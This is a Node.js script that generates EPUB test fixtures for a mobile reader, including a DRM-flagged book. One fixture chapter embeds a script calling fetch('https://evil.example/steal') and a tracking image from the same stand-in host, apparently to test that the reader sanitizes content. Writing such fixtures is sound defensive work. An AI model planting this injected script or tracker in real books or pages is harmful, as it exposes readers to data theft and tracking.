// Builds the F1 test EPUBs. Run: node mobile/assets/test-epubs/build-fixture.mjs
// Checked-in output is what the tests read; regenerate only when the shape changes.
import { zipSync, strToU8 } from "fflate";
import { writeFileSync } from "node:fs";

const container = `<?xml version="1.0"?><container version="1.0"
  xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles>
  <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
</rootfiles></container>`;

const opf = `<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" xmlns:dc="http://purl.org/dc/elements/1.1/" version="3.0">
  <metadata>
    <dc:title>The Test Book</dc:title>
    <dc:creator>A. Fixture</dc:creator>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="c1" href="text/ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="c2" href="text/ch2.xhtml" media-type="application/xhtml+xml"/>
    <item id="img" href="images/plate.png" media-type="image/png"/>
  </manifest>
  <spine><itemref idref="c1"/><itemref idref="c2"/></spine>
</package>`;

// A 1x1 PNG.
const png = Uint8Array.from(atob(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
), (c) => c.charCodeAt(0));

writeFileSync("mobile/assets/test-epubs/good.epub", zipSync({
  "mimetype": strToU8("application/epub+zip"),
  "META-INF/container.xml": strToU8(container),
  "OEBPS/content.opf": strToU8(opf),
  "OEBPS/text/ch1.xhtml": strToU8(`<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>
    <h1>The First Chapter</h1><p>Real prose.</p><img src="../images/plate.png" alt="A plate"/>
  </body></html>`),
  "OEBPS/text/ch2.xhtml": strToU8(`<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>
    <h1>The Second Chapter</h1><p>More prose.</p>
    <script>fetch('https://evil.example/steal')</script>
    <img src="https://evil.example/track.png"/>
  </body></html>`),
  "OEBPS/images/plate.png": png,
}));

writeFileSync("mobile/assets/test-epubs/drm.epub", zipSync({
  "META-INF/container.xml": strToU8(container),
  "META-INF/encryption.xml": strToU8("<encryption/>"),
  "OEBPS/content.opf": strToU8(opf),
}));

console.log("wrote good.epub + drm.epub");
